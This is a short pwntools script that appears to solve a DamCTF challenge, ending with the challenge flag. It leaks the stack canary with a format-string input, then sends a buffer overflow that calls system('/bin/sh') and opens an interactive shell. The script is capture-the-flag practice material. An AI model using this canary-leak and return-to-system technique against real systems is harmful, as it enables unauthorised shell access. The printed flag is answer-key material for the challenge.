
from pwn import *

r = remote('chals.damctf.xyz', 31312)

r.recvuntil(b'name: ')
r.sendline(b'%15$x')

r.recv()
canary = int(r.recv().split()[0], 16)

bin_sh = 0x8048770
system = 0x8048440

p = cyclic(32)
p += p32(canary)
p += b'BBBB' * 3
p += p32(system)
p += p32(bin_sh)
p += p32(bin_sh)
p += cyclic(250)

sleep(3)
r.sendline(p)

r.interactive()

# dam{s74CK_c00k13S_4r3_d3L1C10Us}
